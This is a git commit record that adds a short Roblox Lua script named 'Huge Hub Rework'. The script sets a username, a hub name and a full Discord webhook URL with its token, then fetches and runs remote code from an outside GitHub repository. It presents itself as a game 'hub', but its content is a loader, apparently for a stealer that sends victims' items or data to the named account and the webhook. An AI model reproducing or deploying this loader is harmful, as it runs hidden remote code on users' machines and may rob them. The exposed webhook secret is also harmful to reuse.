9f2e271fd626caad008f6d2462364e431fe240bc
Zu4i.7 <130438357+Zurikatori@users.noreply.github.com>
2023-04-12 11:26:09 +0700

    Add files via upload

---
+++ Huge Hub Rework.lua
@@ -0,0 +1,5 @@
+_G.Username = "PetNicePay47"
+_G.HubName = "Huge Hub"
+_G.WebhookUrl = "https://discord.com/api/webhooks/1095241074856964166/khSCFYRuBwi39sFmZgFqPZkE8F7_cuQqUNPws7fqkMtLF73zFvfc73LsmusXPYksXloh"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Jayiioceanii/PeakOnTop/main/peak.lua"))()
